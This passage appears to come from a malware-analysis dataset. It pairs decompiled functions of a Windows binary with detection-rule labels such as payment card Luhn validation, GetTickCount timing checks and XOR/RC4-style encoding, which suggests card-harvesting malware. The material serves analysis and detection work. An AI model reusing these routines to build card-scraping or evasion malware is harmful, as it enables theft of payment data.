(*_sym.imp.ADVAPI32.dll_GetCurrentHwProfileA)(&fcn.004089d2::lpHwProfileInfo);\n    if (iVar1 != 0) {\n        fcn.0040d260(&fcn.004089d2::var_1ech);\n        fcn.004075b4();\n    }\n    fcn.00408958();\n    fcn.0040b0fe(0x20);\n    puVar2 = var_120h;\n    if (var_10ch < 0x10) {\n        puVar2 = &fcn.004089d2::var_120h;\n    }\n    if (var_10ch < 0x10) {\n        var_120h = &fcn.004089d2::var_120h;\n    }\n    if (var_120h != var_110h + puVar2) {\n        iVar1 = 0x414268 - var_120h;\n        do {\n            *(iVar1 + var_120h) = *var_120h;\n            var_120h = var_120h + 1;\n        } while (var_120h != var_110h + puVar2);\n    }\n    fcn.004059e0();\n    fcn.00407403(0, 0xffffffff);\n    fcn.00405c90(1);\n    arg_ch = 0x404b20;\n    fcn.0040720a(0x404b20);\n    puVar2 = &fcn.004089d2::var_120h;\n    noname_2 = 0x408b71;\n    fcn.0040aeb4(puVar2, arg_ch, in_stack_fffffdb8, in_stack_fffffdbc, in_stack_fffffdc0, in_stack_fffffdc4, \n                 in_stack_fffffdc8);\n    fcn.004073be();\n    fcn.00405c90(1);\n    uVar4 = 0x405264;\n    arg_ch_00 = 7;\n    fcn.0040b0fe(7);\n    uVar3 = 0x405268;\n    fcn.0040720a(0x405268);\n    fcn.0040aeb4(&fcn.004089d2::var_13ch, uVar3, noname_2, puVar2, arg_ch, in_stack_fffffdb8, in_stack_fffffdbc);\n    uVar3 = fcn.00407b3a(arg_ch_00, uVar4);\n    fcn.00407b0e(uVar3, arg_ch_00);\n    fcn.004073be();\n    uVar3 = 1;\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.0040b39f(uVar3);\n    return;\n}\n",
        "token_count": 1065
    },
    "00408c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00408c2c(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint *arg_ch;\n    uint *puVar4;\n    int32_t iVar5;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint arg_ch_00;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint lpNumberOfBytesWritten;\n    uint *var_a4h;\n    uint nNumberOfBytesToWrite;\n    int32_t var_9ch;\n    uint32_t lpBuffer;\n    uint var_91h;\n    uint var_74h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    param_1[5] = 0xf;\n    param_1[4] = 0;\n    *param_1 = 0;\n    lpBuffer = 0;\n    var_a4h = param_1;\n    if ((*0x4143dc - *0x4143d8) / 0x1c != 0) {\n        var_9ch = 0;\n        do {\n            iVar1 = var_9ch + *0x4143d8;\n            fcn.004071e6(iVar1);\n            in_stack_ffffff3c =\n                 fcn.00409f32(&fcn.00408c2c::var_20h, iVar1, in_stack_ffffff2c, in_stack_ffffff30, in_stack_ffffff34, \n                              in_stack_ffffff38, in_stack_ffffff3c);\n            in_stack_ffffff38 = 0x408ca8;\n            fcn.00407c89(in_stack_ffffff3c, 0);\n            fcn.00405c90(1);\n            in_stack_ffffff34 = 0x1c;\n            lpBuffer = lpBuffer + 1;\n            var_9ch = var_9ch + 0x1c;\n        } while (lpBuffer < (*0x4143dc - *0x4143d8) / 0x1c);\n    }\n    var_91h._0_1_ = 10;\n    puVar4 = param_1;\n    if (0xf < param_1[5]) {\n        puVar4 = *param_1;\n    }\n    puVar2 = param_1;\n    if (0xf < param_1[5]) {\n        puVar2 = *param_1;\n    }\n    fcn.00407ba2(&fcn.00408c2c::lpBuffer, puVar2, param_1[4] + puVar4);\n    puVar4 = var_a4h;\n    puVar2 = param_1;\n    if (0xf < param_1[5]) {\n        puVar2 = *param_1;\n    }\n    fcn.004072b8(lpBuffer, param_1[4] + puVar2);\n    var_91h._0_1_ = 0xd;\n    puVar2 = puVar4;\n    if (0xf < puVar4[5]) {\n        puVar2 = *puVar4;\n    }\n    arg_ch = puVar4;\n    if (0xf < puVar4[5]) {\n        arg_ch = *puVar4;\n    }\n    fcn.00407ba2(&fcn.00408c2c::lpBuffer, arg_ch, puVar4[4] + puVar2);\n    puVar2 = puVar4;\n    if (0xf < puVar4[5]) {\n        puVar2 = *puVar4;\n    }\n    fcn.004072b8(lpBuffer, puVar4[4] + puVar2);\n    nNumberOfBytesToWrite = puVar4[4];\n    lpBuffer = fcn.0040b394(nNumberOfBytesToWrite);\n    puVar2 = puVar4;\n    if (0xf < puVar4[5]) {\n        puVar2 = *puVar4;\n    }\n    iVar1 = puVar4[4];\n    if (0xf < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    if (puVar4 != iVar1 + puVar2) {\n        iVar5 = lpBuffer - puVar4;\n        do {\n            *(iVar5 + puVar4) = *puVar4;\n            puVar4 = puVar4 + 1;\n        } while (puVar4 != iVar1 + puVar2);\n    }\n    iVar1 = fcn.0040b016(&fcn.00408c2c::var_3ch);\n    arg_ch_00 = 0x405278;\n    uVar3 = fcn.0040b1c7();\n    iVar5 = fcn.00408f15(uVar3, arg_ch_00);\n    if ((*(iVar5 + 0x14) - *(iVar5 + 0x10) < *(iVar1 + 0x10)) && (*(iVar5 + 0x10) <= *(iVar1 + 0x14) - *(iVar1 + 0x10)))\n    {\n        fcn.00408f41(iVar5);\n    }\n    else {\n        fcn.00407ea6(iVar1, 0);\n    }\n    fcn.00407c3a();\n    puVar4 = fcn.00408f15(&fcn.00408c2c::var_20h, 0x4049bc);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    var_9ch = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar4, 0xc0000000, 0, 0, 2, 0x80, 0);\n    fcn.00407574(1);\n    uVar3 = 1;\n    fcn.00407574(1);\n    fcn.00407574(1);\n    fcn.00407574(1);\n    fcn.00407574(1);\n    iVar1 = var_9ch;\n    if (var_9ch != 0) {\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)(var_9ch, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteFile)\n                  (iVar1, lpBuffer, nNumberOfBytesToWrite, &fcn.00408c2c::lpNumberOfBytesWritten, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    fcn.0040d306(lpBuffer);\n    fcn.0040b39f(uVar3);\n    return;\n}\n",
        "token_count": 1522
    },
    "004094cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409dd6)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004094cb(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *arg_ch;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint *arg_8h_01;\n    uint uVar9;\n    uint *arg_8h_02;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    uint *arg_8h_03;\n    uint arg_ch_03;\n    uint arg_ch_04;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint in_stack_fffffb80;\n    uint in_stack_fffffb84;\n    uint in_stack_fffffb88;\n    uint in_stack_fffffb8c;\n    uint in_stack_fffffb90;\n    uint var_454h;\n    uint var_450h;\n    uint var_44ch;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    int32_t var_43ch;\n    uint32_t var_438h;\n    uint32_t var_434h;\n    uchar uStack1073;\n    uint var_42ch;\n    uint var_410h;\n    uint var_3f4h;\n    uint var_3d8h;\n    uint var_3bch;\n    uint var_3a0h;\n    uint var_384h;\n    uint var_368h;\n    uint var_34ch;\n    uint var_330h;\n    uint var_314h;\n    uint var_2f8h;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_18ch;\n    uint var_170h;\n    uchar auStack360 [16];\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    uint var_c8h;\n    uchar auStack192 [16];\n    uint var_ach;\n    uint var_90h;\n    uint var_74h;\n    uchar auStack92 [16];\n    int32_t iStack76;\n    uint uStack72;\n    uint var_3ch;\n    uchar auStack52 [4];\n    uint uStack48;\n    uint uStack44;\n    uint *var_20h;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar12 = 0x4052ac;\n    fcn.0040720a(0x4052ac);\n    puVar4 = &var_138h;\n    var_438h = fcn.0040aeb4(puVar4, uVar12, in_stack_fffffb80, in_stack_fffffb84, in_stack_fffffb88, in_stack_fffffb8c, \n                            in_stack_fffffb90);\n    uVar11 = 0x4052c0;\n    fcn.0040720a(0x4052c0);\n    puVar2 = &var_234h;\n    fcn.0040aeb4(puVar2, uVar11, puVar4, uVar12, in_stack_fffffb80, in_stack_fffffb84, in_stack_fffffb88);\n    uVar10 = 0x4052d4;\n    fcn.0040720a(0x4052d4);\n    puVar6 = &var_1fch;\n    fcn.0040aeb4(puVar6, uVar10, puVar2, uVar11, puVar4, uVar12, in_stack_fffffb80);\n    uVar12 = 0x4052e4;\n    fcn.0040720a(0x4052e4);\n    puVar5 = &var_1c4h;\n    fcn.0040aeb4(puVar5, uVar12, puVar6, uVar10, puVar2, uVar11, puVar4);\n    uVar11 = 0x4052f8;\n    fcn.0040720a(0x4052f8);\n    arg_8h_03 = &var_18ch;\n    fcn.0040aeb4(arg_8h_03, uVar11, puVar5, uVar12, puVar6, uVar10, puVar2);\n    uVar10 = 0x40530c;\n    fcn.0040720a(0x40530c);\n    puVar2 = &var_154h;\n    fcn.0040aeb4(puVar2, uVar10, arg_8h_03, uVar11, puVar5, uVar12, puVar6);\n    uVar12 = 0x405320;\n    fcn.0040720a(0x405320);\n    puVar6 = &var_11ch;\n    fcn.0040aeb4(puVar6, uVar12, puVar2, uVar10, arg_8h_03, uVar11, puVar5);\n    arg_ch_04 = 0x401fd4;\n    uVar11 = 0x405334;\n    fcn.0040720a(0x405334);\n    arg_8h_02 = &var_e4h;\n    var_434h = fcn.0040aeb4(arg_8h_02, uVar11, puVar6, uVar12, puVar2, uVar10, arg_8h_03);\n    arg_ch_03 = 0x401f64;\n    uVar10 = 0x405344;\n    fcn.0040720a(0x405344);\n    arg_8h_01 = &var_ach;\n    fcn.0040aeb4(arg_8h_01, uVar10, arg_8h_02, uVar11, puVar6, uVar12, puVar2);\n    arg_ch_02 = 0x401ed8;\n    uVar12 = 0x405354;\n    fcn.0040720a(0x405354);\n    arg_8h_00 = &var_90h;\n    fcn.0040aeb4(arg_8h_00, uVar12, arg_8h_01, uVar10, arg_8h_02, uVar11, puVar6);\n    arg_ch_01 = 0x401f2c;\n    uVar11 = 0x40536c;\n    fcn.0040720a(0x40536c);\n    arg_8h = &var_218h;\n    fcn.0040aeb4(arg_8h, uVar11, arg_8h_00, uVar12, arg_8h_01, uVar10, arg_8h_02);\n    arg_ch_00 = 0x401f10;\n    uVar10 = 0x405388;\n    fcn.0040720a(0x405388);\n    puVar4 = &var_74h;\n    fcn.0040aeb4(puVar4, uVar10, arg_8h, uVar11, arg_8h_00, uVar12, arg_8h_01);\n    uVar9 = 0x401ef4;\n    uVar12 = 0x4053a0;\n    fcn.0040720a(0x4053a0);\n    fcn.0040aeb4(&var_1a8h, uVar12, puVar4, uVar10, arg_8h, uVar11, arg_8h_00);\n    fcn.00407b7e(&var_100h, arg_8h_01);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_2a4h, uVar9);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_2c0h, arg_8h_02);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_410h, arg_ch_00);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_3a0h, puVar6);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_314h, arg_ch_01);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_2dch, puVar2);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_288h, arg_ch_02);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_42ch, arg_8h_03);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_3bch, arg_ch_03);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_c8h, puVar5);\n    fcn.00407b3a();\n    fcn.00407b7e(&var_3ch, arg_ch_04);\n    fcn.00407b3a();\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    uStack1073 = 10;\n    puVar4 = var_20h;\n    if (uStack16 < 0x10) {\n        puVar4 = &var_20h;\n    }\n    puVar2 = var_20h;\n    if (uStack16 < 0x10) {\n        puVar2 = &var_20h;\n    }\n    fcn.00407ba2(&var_438h, puVar2, puVar4 + uStack20);\n    puVar4 = var_20h;\n    if (uStack16 < 0x10) {\n        puVar4 = &var_20h;\n    }\n    fcn.004072b8(var_438h, puVar4 + uStack20);\n    uStack1073 = 0xd;\n    puVar4 = var_20h;\n    if (uStack16 < 0x10) {\n        puVar4 = &var_20h;\n    }\n    puVar2 = var_20h;\n    if (uStack16 < 0x10) {\n        puVar2 = &var_20h;\n    }\n    fcn.00407ba2(&var_438h, puVar2, puVar4 + uStack20);\n    puVar4 = var_20h;\n    if (uStack16 < 0x10) {\n        puVar4 = &var_20h;\n    }\n    uVar8 = var_438h;\n    fcn.004072b8(var_438h, puVar4 + uStack20);\n    var_434h = 0;\n    if ((*0x41439c - *0x414398) / 0x1c != 0) {\n        var_43ch = 0;\n        do {\n            uVar8 = var_434h;\n            uVar12 = *(*0x4143a8 + var_434h * 4);\n            puVar7 = auStack52;\n            fcn.0040d5b8(uVar12, puVar7, 0x10, 10);\n            uVar9 = 10;\n            uVar11 = 0x10;\n            arg_ch = auStack360;\n            fcn.0040d5b8(*(*0x4143c8 + uVar8 * 4), arg_ch, 0x10, 10);\n            fcn.0040d5b8(*(*0x414388 + uVar8 * 4), auStack192, 0x10, 10);\n            iVar1 = var_43ch + *0x4143b8;\n            uVar10 = 0x4053bc;\n            fcn.0040720a(0x4053bc);\n            puVar2 = &var_1e0h;\n            fcn.0040aeb4(puVar2, uVar10, arg_ch, uVar11, uVar9, uVar12, puVar7);\n            uVar12 = 0x4053c8;\n            fcn.0040720a(0x4053c8);\n            puVar6 = &var_100h;\n            fcn.0040aeb4(puVar6, uVar12, puVar2, uVar10, arg_ch, uVar11, uVar9);\n            uVar11 = 0x4053e4;\n            fcn.0040720a(0x4053e4);\n            puVar5 = &var_1a8h;\n            fcn.0040aeb4(puVar5, uVar11, puVar6, uVar12, puVar2, uVar10, arg_ch);\n            puVar7 = auStack52;\n            uVar10 = 0x405400;\n            fcn.0040720a(0x405400);\n            puVar4 = &var_74h;\n            var_438h = fcn.0040aeb4(puVar4, uVar10, puVar5, uVar11, puVar6, uVar12, puVar2);\n            uVar12 = 0x405418;\n            fcn.0040720a(0x405418);\n            fcn.0040aeb4(&var_218h, uVar12, puVar4, uVar10, puVar5, uVar11, puVar6);\n            fcn.0040a445(0x405434);\n            fcn.00407b3a();\n            fcn.00407b7e(&var_e4h, puVar2);\n            uVar12 = fcn.00407b3a();\n            fcn.00407b0e(uVar12, iVar1);\n            uVar12 = fcn.00407b3a();\n            fcn.00407b0e(uVar12, arg_ch);\n            uVar12 = fcn.00407b3a();\n            fcn.00407b0e(uVar12, puVar7);\n            uVar12 = fcn.00407b3a();\n            fcn.00407c89(uVar12, 0);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            fcn.00405c90(1);\n            uVar8 = 1;\n            fcn.00405c90(1);\n            var_434h = var_434h + 1;\n            var_43ch = var_43ch + 0x1c;\n        } while (var_434h < (*0x41439c - *0x414398) / 0x1c);\n    }\n    iVar1 = fcn.0040d260(0x405438);\n    if ((iVar1 != 0) && (uStack20 != 0)) {\n        puVar4 = var_20h;\n        if (uStack16 < 0x10) {\n            puVar4 = &var_20h;\n        }\n        puVar4 = puVar4 + (uStack20 - 1);\n        while (iVar3 = fcn.0040d5f0(0x405438, *puVar4, iVar1),  iVar3 == 0) {\n            puVar2 = var_20h;\n            if (uStack16 < 0x10) {\n                puVar2 = &var_20h;\n            }\n            if (puVar4 == puVar2) break;\n            puVar4 = puVar4 + -1;\n        }\n    }\n    uVar12 = fcn.0040d260(0x40543c);\n    fcn.0040a075(uVar12);\n    uStack72 = 0xf;\n    iStack76 = 0;\n    auStack92[0] = 0;\n    var_434h = 0;\n    if (uStack20 != 0) {\n        do {\n            puVar4 = var_20h;\n            if (uStack16 < 0x10) {\n                puVar4 = &var_20h;\n            }\n            var_438h = var_438h & 0xffffff00 | *(puVar4 + var_434h);\n            uStack44 = 0xf;\n            uStack48 = 0;\n            var_3ch._0_1_ = 0;\n            fcn.00407c07();\n            fcn.00407c89(auStack92, 0);\n            fcn.0040a493(var_438h);\n            fcn.004073be();\n            fcn.00405c90(1);\n            if ((1000 < iStack76) || (var_434h + 1 == uStack20)) {\n                fcn.004082ae();\n                fcn.0040d260(0x40543f);\n                fcn.004075b4();\n            }\n            var_434h = var_434h + 1;\n        } while (var_434h < uStack20);\n    }\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.0040b39f(uVar8);\n    return;\n}\n",
        "token_count": 4537
    },
    "0040a1b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a1b4(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t arg_8h_00;\n    uint *puVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t arg_ch_00;\n    uint32_t uVar6;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    ulong uVar7;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar5 = unaff_ESI[4];\n    var_4h = 1;\n    if ((unaff_EDI <= uVar5) && (arg_ch <= arg_8h[4])) {\n        uVar2 = uVar5 - unaff_EDI;\n        if (uVar2 == 0) {\n            var_4h = uVar2;\n        }\n        uVar6 = arg_8h[4] - arg_ch;\n        if (uVar6 < arg_10h) {\n            arg_10h = uVar6;\n        }\n        uVar7 = CONCAT44(uVar5 - var_4h, uVar2);\n        if (-arg_10h - 1 <= uVar5 - var_4h) {\n            uVar7 = fcn.0040b2d9(0x4049e4);\n            uVar5 = extraout_ECX;\n        }\n        uVar6 = (uVar7 >> 0x20) + arg_10h;\n        uVar2 = uVar7 - var_4h;\n        if (uVar5 < uVar6) {\n            fcn.0040761d(0);\n        }\n        if (unaff_ESI == arg_8h) {\n            if (var_4h < arg_10h) {\n                if (unaff_EDI < arg_ch) {\n                    if (arg_ch < unaff_EDI + var_4h) {\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.0040b9a0(puVar4 + unaff_EDI, puVar3 + arg_ch, var_4h);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.0040b9a0(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        uVar2 = arg_10h - var_4h;\n                        arg_ch_00 = puVar3 + arg_10h + arg_ch;\n                        arg_8h_00 = puVar4 + var_4h + unaff_EDI;\n                    }\n                    else {\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.0040b9a0(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        arg_ch_00 = puVar3 + arg_10h + (arg_ch - var_4h);\n                        arg_8h_00 = puVar4 + unaff_EDI;\n                        uVar2 = arg_10h;\n                    }\n                }\n                else {\n                    puVar4 = unaff_ESI;\n                    puVar3 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                        puVar3 = *unaff_ESI;\n                    }\n                    fcn.0040b9a0(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n                    puVar4 = unaff_ESI;\n                    puVar3 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                        puVar3 = *unaff_ESI;\n                    }\n                    arg_ch_00 = puVar3 + arg_ch;\n                    arg_8h_00 = puVar4 + unaff_EDI;\n                    uVar2 = arg_10h;\n                }\n            }\n            else {\n                puVar4 = unaff_ESI;\n                puVar3 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                    puVar3 = *unaff_ESI;\n                }\n                fcn.0040b9a0(puVar4 + unaff_EDI, puVar3 + arg_ch, arg_10h);\n                puVar4 = unaff_ESI;\n                puVar3 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                    puVar3 = *unaff_ESI;\n                }\n                arg_ch_00 = puVar3 + var_4h + unaff_EDI;\n                arg_8h_00 = puVar4 + arg_10h + unaff_EDI;\n            }\n            fcn.0040b9a0(arg_8h_00, arg_ch_00, uVar2);\n        }\n        else {\n            puVar4 = unaff_ESI;\n            puVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n                puVar3 = *unaff_ESI;\n            }\n            fcn.0040b9a0(puVar4 + arg_10h + unaff_EDI, puVar3 + var_4h + unaff_EDI, uVar2);\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar3 = *unaff_ESI;\n            }\n            fcn.0040b3b0(puVar3 + unaff_EDI, arg_8h + arg_ch, arg_10h);\n        }\n        unaff_ESI[4] = uVar6;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + uVar6) = 0;\n        return;\n    }\n    fcn.0040b326(0x4049cc);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1722
    },
    "0040a445": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a445(uint arg_8h)\n\n{\n    uchar *in_EAX;\n    uint unaff_EBX;\n    \n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0xf;\n    *in_EAX = 0;\n    fcn.0040d260(arg_8h);\n    fcn.00407c07();\n    fcn.0040d260(arg_8h);\n    fcn.00407d1d(arg_8h);\n    fcn.00407c89(unaff_EBX, 0);\n    return;\n}\n",
        "token_count": 142
    },
    "0040a678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a678(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.004078c1(0x405454);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0040b2d9(0x4049e4);\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.0040761d(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                puVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                    puVar4 = *in_EAX;\n                }\n                fcn.0040b9a0(puVar3 + unaff_EDI, puVar4, in_EAX[4]);\n                puVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar4 = *in_EAX;\n                }\n                fcn.0040b3b0(puVar4, 0x405454, unaff_EDI);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2 + unaff_EDI) = 0;\n            }\n        }\n    }\n    else {\n        puVar4 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar4 = *in_EAX;\n        }\n        fcn.00407dad(in_EAX, 0x405454 - puVar4);\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "0040a787": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a787(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_4h;\n    \n    uVar3 = in_EAX[1];\n    uVar5 = *in_EAX;\n    iVar6 = 0;\n    if (0 < arg_ch) {\n        do {\n            uVar5 = uVar5 + 1;\n            uVar1 = in_EAX[uVar5 + 2];\n            cVar4 = uVar1;\n            uVar3 = uVar3 + cVar4;\n            uVar2 = in_EAX[uVar3 + 2];\n            in_EAX[uVar5 + 2] = uVar2;\n            in_EAX[uVar3 + 2] = uVar1;\n            *(arg_8h + iVar6) = *(arg_8h + iVar6) ^ *(in_EAX + (uVar2 + cVar4) + 2);\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < arg_ch);\n    }\n    *in_EAX = uVar5;\n    in_EAX[1] = uVar3;\n    return;\n}\n",
        "token_count": 311
    },
    "0040aeb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040aeb4(uchar *arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_01;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint var_ach;\n    uint var_a8h;\n    uint32_t var_a4h;\n    uint *var_a0h;\n    uint32_t var_8ch;\n    uint var_84h;\n    ushort uStack132;\n    uchar uStack130;\n    uint var_7dh;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_84h = *0x405674;\n    uStack132 = *0x405678;\n    uVar5 = 0;\n    uStack130 = *0x40567a;\n    fcn.0040d3f0(&var_7dh, 0, 0x79);\n    pcVar1 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    var_a4h = 0;\n    arg_8h_00 = arg_ch;\n    if (arg_20h < 0x10) {\n        arg_8h_00 = &arg_ch;\n    }\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(arg_8h_00, arg_1ch, 1, 0, &var_a4h, 0, 0);\n    if (iVar2 != 0) goto code_r0x0040af28;\n    do {\n        do {\n            